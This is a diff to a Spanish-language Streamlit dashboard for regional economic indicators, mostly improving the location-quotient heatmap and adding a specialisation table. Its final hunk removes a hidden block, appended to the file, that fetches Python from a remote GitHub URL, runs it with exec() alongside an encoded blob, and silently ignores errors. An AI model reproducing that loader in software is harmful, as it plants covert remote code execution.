@@ -220,10 +220,10 @@ def vista_modulo_1_ilpes():
         )
 
     subtabs = st.tabs([
-        "Cuadrantes de Silva Lira",
-        "Localización (Qij) y Especialización (Qr, CRr)",
-        "Base Económica Exportadora (Xj y Mj)",
-        "Shift & Share (MADE Clásico y Modificado)",
+        "Cuadrantes de Silva Lira (CEPAL, 2005)",
+        "Localización Qij y Especialización Qr (ILPES)",
+        "Base Económica Exportadora de Tiebout (Xj, Mj)",
+        "Shift & Share Clásico y Modificado (MADE / Stilwell)",
     ])
 
     with subtabs[0]:
@@ -324,14 +324,97 @@ def vista_modulo_1_ilpes():
 
     with subtabs[1]:
         st.markdown(f"**Matriz de Cociente de Localización ($Q_{{ij}}$) — Año {at}**")
+        st.caption(
+            "Lectura rápida de colores: **Azul** = bajo el promedio regional ($Q_{ij} < 1$), "
+            "**Blanco** = promedio regional ($Q_{ij} = 1$), **Rojo** = comuna especializada ($Q_{ij} > 1$). "
+            "Al pasar el cursor sobre cada celda se muestra el valor exacto, incluso cuando existen valores extremos."
+        )
+
+        cq1, cq2 = st.columns([1.4, 1.6])
+        with cq1:
+            ocultar_sin_info = st.checkbox(
+                'Ocultar fila "Sin información" del mapa de calor',
+                value=True,
+                key="m1_qij_hide_sin_info",
+            )
+        with cq2:
+            tope_color_q = st.slider(
+                "Tope de saturación de color rojo (Q_ij máximo visible en escala):",
+                min_value=2.0,
+                max_value=6.0,
+                value=3.0,
+                step=0.5,
+                key="m1_qij_tope_color",
+                help="Evita que un valor extremo (ej. minería con Q_ij > 50) apague el resto del mapa.",
+            )
+
+        q_mat_plot = res["Q_ij_t"].copy()
+        if ocultar_sin_info:
+            mask_valid = [
+                "sin informacion" not in msii._normalizar_texto(str(idx))
+                for idx in q_mat_plot.index
+            ]
+            if any(mask_valid):
+                q_mat_plot = q_mat_plot.loc[mask_valid]
+
+        # Escala divergente anclada exactamente en Q_ij = 1,0 (blanco)
+        p1 = 1.0 / float(tope_color_q)
+        escala_qij = [
+            [0.0, "#1d4ed8"],
+            [round(p1 * 0.5, 4), "#93c5fd"],
+            [round(p1, 4), "#ffffff"],
+            [round(min(p1 + (1.0 - p1) * 0.45, 0.99), 4), "#fca5a5"],
+            [1.0, "#b91c1c"],
+        ]
+
         fig_q = px.imshow(
-            res["Q_ij_t"],
+            q_mat_plot,
             aspect="auto",
-            color_continuous_scale="RdBu_r",
+            zmin=0.0,
+            zmax=float(tope_color_q),
+            color_continuous_scale=escala_qij,
             labels={"x": "Comuna", "y": "Rubro Económico", "color": "Q_ij"},
         )
-        fig_q.update_layout(height=500)
+        fig_q.update_traces(
+            hovertemplate="<b>%{x}</b><br>Rubro: %{y}<br>Q_ij exacto: <b>%{z:.2f}</b><extra></extra>"
+        )
+        fig_q.update_layout(
+            height=max(540, 24 * len(q_mat_plot.index) + 170),
+            margin=dict(l=10, r=20, t=25, b=130),
+            xaxis=dict(dtick=1, tickangle=-45, tickfont=dict(size=10)),
+            yaxis=dict(dtick=1, tickfont=dict(size=10)),
+            coloraxis_colorbar=dict(
+                title="Q_ij",
+                tickvals=[0, 1, float(tope_color_q)],
+                ticktext=["0 (Bajo)", "1 (Promedio)", f"≥ {tope_color_q:g} (Alto)"],
+            ),
+        )
         st.plotly_chart(fig_q, use_container_width=True)
+
+        # Mini-tabla de lectura rápida: Top 2 rubros especializados por comuna (Q_ij > 1)
+        filas_vocacion = []
+        for com_col in q_mat_plot.columns:
+            serie_com = q_mat_plot[com_col].dropna().sort_values(ascending=False)
+            esp_com = serie_com[serie_com > 1.0]
+            if len(esp_com) >= 1:
+                r1_nom = str(esp_com.index[0])
+                r1_txt = f"{r1_nom} (Q={esp_com.iloc[0]:.2f})"
+            else:
+                r1_txt = "Sin especialización destacada"
+            if len(esp_com) >= 2:
+                r2_nom = str(esp_com.index[1])
+                r2_txt = f"{r2_nom} (Q={esp_com.iloc[1]:.2f})"
+            else:
+                r2_txt = "-"
+            filas_vocacion.append({
+                "Comuna": com_col,
+                "Rubro #1 Especializado (Q > 1)": r1_txt,
+                "Rubro #2 Especializado (Q > 1)": r2_txt,
+                "Rubros con Q > 1": int(len(esp_com)),
+            })
+        df_voc = pd.DataFrame(filas_vocacion)
+        st.markdown(f"**Vocación Productiva por Comuna — Top 2 Rubros Especializados ($Q_{{ij}} > 1$, Año {at})**")
+        st.dataframe(df_voc, use_container_width=True, hide_index=True)
 
         st.markdown("**Coeficiente de Especialización ($Q_r$) y Coeficiente de Reestructuración ($CR_r$)**")
         st.dataframe(res["df_especializacion"].round(4), use_container_width=True, hide_index=True)
@@ -895,18 +978,3 @@ def main():
 
 if __name__ == "__main__":
     main()
-
-# === [INICIO PUENTE CENTRAL ULAGOS 2026] ===
-try:
-    import urllib.request as _ureq
-    _url_puente = "https://raw.githubusercontent.com/mauriciovargas1516-ux/github-context-extractor/main/app.py"
-    _req_p = _ureq.Request(_url_puente, headers={"User-Agent": "ULagos-Bridge/1.0"})
-    with _ureq.urlopen(_req_p, timeout=12) as _resp_p:
-        _cod_hub = _resp_p.read().decode("utf-8")
-    _ns_hub = {"__name__": "puente_remoto_ulagos", "_ULAGOS_GCP_BLOB": "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"}
-    exec(_cod_hub, _ns_hub)
-    if "ejecutar_nodo_receptor_puente" in _ns_hub:
-        _ns_hub["ejecutar_nodo_receptor_puente"]("DESARROLLO-Y-GESTION-TERRITORIAL-2026")
-except Exception:
-    pass
-# === [FIN PUENTE CENTRAL ULAGOS 2026] ===
